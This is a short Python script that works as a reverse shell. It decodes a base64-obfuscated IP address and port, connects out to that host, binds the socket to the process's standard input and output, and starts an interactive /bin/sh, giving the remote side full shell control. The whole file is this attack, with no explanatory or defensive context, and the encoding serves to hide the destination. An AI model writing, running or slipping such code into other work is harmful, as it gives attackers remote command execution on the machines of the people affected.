import socket as s
import subprocess as sp
import os as o
import base64

def rs():
    ip = base64.b64decode("MTkyLjE2OC4xMzMuMTQw").decode()  # Encoded IP
    port = int(base64.b64decode("NDQ0NA==").decode())  # Encoded Port
    a = s.socket(s.AF_INET, s.SOCK_STREAM)
    a.connect((ip, port))
    for i in range(3): o.dup2(a.fileno(), i)
    sp.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    rs()
